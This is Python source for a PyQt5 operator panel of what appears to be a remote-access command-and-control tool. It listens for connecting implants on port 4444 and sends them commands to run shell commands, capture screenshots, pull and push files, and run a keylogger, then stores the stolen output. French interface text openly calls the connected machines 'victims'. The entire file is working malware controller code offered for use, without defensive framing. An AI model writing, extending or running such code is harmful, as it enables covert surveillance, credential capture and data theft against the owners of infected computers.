#!/usr/bin/env python3
"""
Client Tab - Control connected C2 clients
"""

import json
import socket
import threading
import base64
from pathlib import Path
from datetime import datetime

from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QListWidget,
    QListWidgetItem,
    QTextEdit,
    QMessageBox,
    QFileDialog,
    QSpinBox,
    QGroupBox,
    QInputDialog,
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont


class ListenerThread(QThread):
    """Thread for listening to incoming connections"""

    client_connected = pyqtSignal(str, str)  # ip, info
    client_data = pyqtSignal(str, dict)  # ip, data

    def __init__(self, listen_port=4444):
        super().__init__()
        self.listen_port = listen_port
        self.running = True
        self.clients = {}

    def run(self):
        """Listen for connections"""
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(("0.0.0.0", self.listen_port))
            listener.listen(5)
            listener.settimeout(1)

            print(f"[+] Listening on port {self.listen_port}")

            while self.running:
                try:
                    conn, addr = listener.accept()
                    client_ip = f"{addr[0]}:{addr[1]}"

                    # Receive initial info
                    data = conn.recv(4096).decode()
                    client_info = json.loads(data)

                    self.clients[client_ip] = {
                        "socket": conn,
                        "info": client_info,
                        "connected": datetime.now(),
                    }

                    info_str = f"[{client_info.get('platform')}] {client_info.get('user')}@{client_info.get('hostname')}"
                    self.client_connected.emit(client_ip, info_str)

                    # Handle client in separate thread
                    self.handle_client(conn, client_ip)

                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] Connection error: {e}")

        except Exception as e:
            print(f"[!] Listener error: {e}")
        finally:
            try:
                listener.close()
            except:
                pass

    def handle_client(self, conn, client_ip):
        """Handle individual client"""

        def client_thread():
            try:
                while self.running:
                    data = conn.recv(4096).decode()
                    if not data:
                        break

                    client_data = json.loads(data)
                    self.client_data.emit(client_ip, client_data)
            except:
                pass
            finally:
                try:
                    if client_ip in self.clients:
                        del self.clients[client_ip]
                except:
                    pass

        t = threading.Thread(target=client_thread, daemon=True)
        t.start()

    def send_command(self, client_ip, command):
        """Send command to client"""
        try:
            if client_ip in self.clients:
                conn = self.clients[client_ip]["socket"]
                conn.send(json.dumps(command).encode())
                return True
        except:
            pass
        return False

    def stop(self):
        """Stop listener"""
        self.running = False


class ClientTab(QWidget):
    """Client control tab"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent = parent
        self.listener_thread = None
        self.current_client = None
        self.pending_downloads = {}
        self.pending_screenshots = {}
        self.artifacts_root = Path.home() / "pupy_artifacts"
        self.artifacts_root.mkdir(parents=True, exist_ok=True)
        self.init_ui()

    def init_ui(self):
        """Initialize UI"""
        layout = QVBoxLayout()

        # === Listener Section ===
        listener_group = QGroupBox("🔗 Listener")
        listener_layout = QHBoxLayout()

        listener_layout.addWidget(QLabel("Port:"))
        self.port_spinbox = QSpinBox()
        self.port_spinbox.setValue(4444)
        self.port_spinbox.setMinimum(1)
        self.port_spinbox.setMaximum(65535)
        listener_layout.addWidget(self.port_spinbox)

        self.start_listener_btn = QPushButton("▶️ Start Listener")
        self.start_listener_btn.clicked.connect(self.start_listener)
        listener_layout.addWidget(self.start_listener_btn)

        listener_group.setLayout(listener_layout)
        layout.addWidget(listener_group)

        # === Clients List ===
        clients_group = QGroupBox("👥 Connected Clients")
        clients_layout = QVBoxLayout()

        self.clients_list = QListWidget()
        self.clients_list.itemClicked.connect(self.on_client_selected)
        clients_layout.addWidget(self.clients_list)

        clients_group.setLayout(clients_layout)
        layout.addWidget(clients_group)

        # === Commands Section ===
        commands_group = QGroupBox("⚙️ Commands")
        commands_layout = QVBoxLayout()

        # Command input
        cmd_layout = QHBoxLayout()
        cmd_layout.addWidget(QLabel("Command:"))
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("e.g., whoami, ipconfig, dir C:\\")
        cmd_layout.addWidget(self.command_input)

        exec_btn = QPushButton("▶️ Execute")
        exec_btn.clicked.connect(self.execute_command)
        cmd_layout.addWidget(exec_btn)
        commands_layout.addLayout(cmd_layout)

        # Quick buttons
        quick_layout = QHBoxLayout()

        screenshot_btn = QPushButton("📷 Screenshot")
        screenshot_btn.clicked.connect(self.cmd_screenshot)
        quick_layout.addWidget(screenshot_btn)

        download_btn = QPushButton("⬇️ Download")
        download_btn.clicked.connect(self.cmd_download)
        quick_layout.addWidget(download_btn)

        upload_btn = QPushButton("⬆️ Upload")
        upload_btn.clicked.connect(self.cmd_upload)
        quick_layout.addWidget(upload_btn)

        keylog_btn = QPushButton("⌨️ Keylogger")
        keylog_btn.clicked.connect(self.cmd_keylogger)
        quick_layout.addWidget(keylog_btn)

        commands_layout.addLayout(quick_layout)
        commands_group.setLayout(commands_layout)
        layout.addWidget(commands_group)

        # === Quick Actions ===
        actions_group = QGroupBox("🧰 Quick Actions")
        actions_layout = QHBoxLayout()
        quick_actions = [
            ("Whoami", "whoami"),
            ("Hostname", "hostname"),
            ("IP Config", "ipconfig /all"),
            ("System Info", "systeminfo"),
            ("List Processes", "tasklist"),
        ]
        for label, command in quick_actions:
            btn = QPushButton(label)
            btn.clicked.connect(lambda _, cmd=command: self.send_exec_command(cmd))
            actions_layout.addWidget(btn)

        info_btn = QPushButton("Client Info")
        info_btn.clicked.connect(self.request_client_info)
        actions_layout.addWidget(info_btn)

        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)

        # === Output ===
        output_group = QGroupBox("📊 Output")
        output_layout = QVBoxLayout()

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Courier", 9))
        output_layout.addWidget(self.output_text)

        output_group.setLayout(output_layout)
        layout.addWidget(output_group)

        self.setLayout(layout)

    def start_listener(self):
        """Start listening for connections"""
        if self.listener_thread and self.listener_thread.isRunning():
            self.listener_thread.stop()
            self.listener_thread = None
            self.start_listener_btn.setText("▶️ Start Listener")
            self.output_text.append("[*] Listener stopped")
            return

        port = self.port_spinbox.value()
        self.listener_thread = ListenerThread(port)
        self.listener_thread.client_connected.connect(self.on_client_connected)
        self.listener_thread.client_data.connect(self.on_client_data)
        self.listener_thread.start()

        self.start_listener_btn.setText("⏹️ Stop Listener")
        self.output_text.append(f"[+] Listener started on port {port}")

    def on_client_connected(self, client_ip, info):
        """Client connected"""
        item = QListWidgetItem(f"✅ {client_ip} - {info}")
        item.setData(Qt.UserRole, client_ip)
        self.clients_list.addItem(item)
        self.output_text.append(f"\n[+] Client connected: {client_ip}")
        self.output_text.append(f"    {info}\n")

        # ALERTE: Nouvelle victime!
        QMessageBox.information(
            self,
            "🔔 Nouvelle Victime!",
            f"Client connecté!\n\n"
            f"IP: {client_ip}\n"
            f"Info: {info}\n\n"
            f"Vous avez maintenant {self.clients_list.count()} victime(s) connectée(s).",
        )

    def on_client_selected(self, item):
        """Select client"""
        self.current_client = item.data(Qt.UserRole)
        self.output_text.append(f"\n[*] Selected client: {self.current_client}\n")

    def on_client_data(self, client_ip, data):
        """Data received from client"""
        data_type = data.get("type")

        if data_type == "exec":
            output = data.get("output", "")
            self.output_text.append(f"\n[{client_ip}] Command output:\n{output}\n")

        elif data_type == "download":
            if data.get("success"):
                local_path = self.pending_downloads.pop(client_ip, None)
                if not local_path:
                    local_path = self._artifact_path(
                        "downloads", Path(data.get("file", "downloaded.bin")).name
                    )
                try:
                    file_data = base64.b64decode(data.get("data", ""))
                    local_path.parent.mkdir(parents=True, exist_ok=True)
                    with open(local_path, "wb") as f:
                        f.write(file_data)
                    self.output_text.append(
                        f"\n[{client_ip}] Download saved to {local_path}\n"
                    )
                except Exception as e:
                    self.output_text.append(
                        f"\n[{client_ip}] Failed to save download: {e}\n"
                    )
            else:
                self.output_text.append(
                    f"\n[{client_ip}] Download failed: {data.get('error', 'unknown error')}\n"
                )

        elif data_type == "upload":
            if data.get("success"):
                self.output_text.append(
                    f"\n[{client_ip}] Upload complete: {data.get('file')}\n"
                )
            else:
                self.output_text.append(
                    f"\n[{client_ip}] Upload failed: {data.get('error', 'unknown error')}\n"
                )

        elif data_type == "screenshot":
            if data.get("success"):
                local_path = self.pending_screenshots.pop(client_ip, None)
                if not local_path:
                    filename = (
                        f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                    )
                    local_path = self._artifact_path("screenshots", filename)
                try:
                    img_data = base64.b64decode(data.get("data", ""))
                    local_path.parent.mkdir(parents=True, exist_ok=True)
                    with open(local_path, "wb") as f:
                        f.write(img_data)
                    self.output_text.append(
                        f"\n[{client_ip}] Screenshot saved to {local_path}\n"
                    )
                except Exception as e:
                    self.output_text.append(
                        f"\n[{client_ip}] Failed to save screenshot: {e}\n"
                    )
            else:
                self.output_text.append(f"\n[{client_ip}] Screenshot failed\n")

        elif data_type == "keylog":
            keys = data.get("keys") or data.get("error", "No data")
            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            local_path = self._artifact_path("keylogs", filename)
            try:
                local_path.parent.mkdir(parents=True, exist_ok=True)
                with open(local_path, "w", encoding="utf-8") as f:
                    f.write(keys)
                self.output_text.append(
                    f"\n[{client_ip}] Keylog saved to {local_path}\n"
                )
            except Exception as e:
                self.output_text.append(f"\n[{client_ip}] Failed to save keylog: {e}\n")

        elif data_type == "info":
            info_lines = [
                f"Hostname: {data.get('hostname', 'n/a')}",
                f"Platform: {data.get('platform', 'n/a')}",
                f"User: {data.get('user', 'n/a')}",
                f"Listener: {data.get('ip', 'n/a')}:{data.get('port', 'n/a')}",
            ]
            self.output_text.append(
                f"\n[{client_ip}] Client info:\n" + "\n".join(info_lines) + "\n"
            )

        elif data_type == "exit":
            self.output_text.append(f"\n[{client_ip}] Client disconnected\n")

        else:
            self.output_text.append(f"[{client_ip}] {data}")

    def execute_command(self):
        """Execute command on selected client"""
        if not self.current_client:
            QMessageBox.warning(self, "Error", "No client selected")
            return

        cmd = self.command_input.text().strip()
        if not cmd:
            return

        command = {"cmd": "exec", "data": cmd}

        if self.listener_thread.send_command(self.current_client, command):
            self.output_text.append(f"\n[>] Command sent: {cmd}\n")
            self.command_input.clear()
        else:
            QMessageBox.critical(self, "Error", "Failed to send command")

    def cmd_screenshot(self):
        """Take screenshot"""
        if not self.current_client:
            QMessageBox.warning(self, "Error", "No client selected")
            return

        command = {"cmd": "screenshot"}
        filename = (
            f"{self.current_client.replace(':', '_')}_"
            f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        )
        self.pending_screenshots[self.current_client] = self._artifact_path(
            "screenshots", filename
        )
        if self.listener_thread.send_command(self.current_client, command):
            self.output_text.append(f"\n[>] Screenshot request sent\n")
        else:
            QMessageBox.critical(self, "Error", "Failed to send command")

    def cmd_download(self):
        """Download file from client"""
        if not self.current_client:
            QMessageBox.warning(self, "Error", "No client selected")
            return

        remote_path, ok = QInputDialog.getText(
            self,
            "Remote File",
            "Chemin complet du fichier sur la victime:",
        )
        if not ok or not remote_path:
            return

        suggested_name = Path(remote_path).name or "downloaded.bin"
        local_path, _ = QFileDialog.getSaveFileName(
            self,
            "Sauvegarder le fichier",
            str(self._artifact_path("downloads", suggested_name)),
        )
        if not local_path:
            return

        self.pending_downloads[self.current_client] = Path(local_path)
        command = {"cmd": "download", "file": remote_path}
        if self.listener_thread.send_command(self.current_client, command):
            self.output_text.append(
                f"\n[>] Download request: {remote_path} -> {local_path}\n"
            )
        else:
            QMessageBox.critical(self, "Error", "Failed to send command")

    def cmd_upload(self):
        """Upload file to client"""
        if not self.current_client:
            QMessageBox.warning(self, "Error", "No client selected")
            return

        file_path, _ = QFileDialog.getOpenFileName(self, "Select file to upload")
        if file_path:
            try:
                with open(file_path, "rb") as f:
                    data = base64.b64encode(f.read()).decode()

                dest_path, ok = QInputDialog.getText(
                    self,
                    "Destination",
                    "Chemin complet de destination sur la victime:",
                    text=f"C:\\{Path(file_path).name}",
                )
                if not ok or not dest_path:
                    return

                command = {"cmd": "upload", "file": dest_path, "data": data}
                if self.listener_thread.send_command(self.current_client, command):
                    self.output_text.append(
                        f"\n[>] Upload: {file_path} -> {dest_path}\n"
                    )
                else:
                    QMessageBox.critical(self, "Error", "Failed to send command")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read file: {e}")

    def cmd_keylogger(self):
        """Start keylogger"""
        if not self.current_client:
            QMessageBox.warning(self, "Error", "No client selected")
            return
        duration, ok = QInputDialog.getInt(
            self,
            "Keylogger",
            "Durée en secondes:",
            value=60,
            min=10,
            max=600,
        )
        if not ok:
            return

        command = {"cmd": "keylog", "duration": duration}
        if self.listener_thread.send_command(self.current_client, command):
            self.output_text.append(f"\n[>] Keylogger started ({duration}s)\n")
        else:
            QMessageBox.critical(self, "Error", "Failed to send command")

    def send_exec_command(self, command_text: str):
        """Send predefined exec command via button."""
        if not self.current_client:
            QMessageBox.warning(self, "Error", "No client selected")
            return

        command = {"cmd": "exec", "data": command_text}
        if self.listener_thread.send_command(self.current_client, command):
            self.output_text.append(f"\n[>] Command sent: {command_text}\n")
        else:
            QMessageBox.critical(self, "Error", "Failed to send command")

    def request_client_info(self):
        """Request system information from client."""
        if not self.current_client:
            QMessageBox.warning(self, "Error", "No client selected")
            return

        command = {"cmd": "info"}
        if self.listener_thread.send_command(self.current_client, command):
            self.output_text.append("\n[>] Client info request sent\n")
        else:
            QMessageBox.critical(self, "Error", "Failed to send command")

    def _artifact_path(self, category: str, filename: str) -> Path:
        """Utility to build artifact storage path."""
        safe_filename = filename or "artifact.bin"
        return self.artifacts_root / category / safe_filename
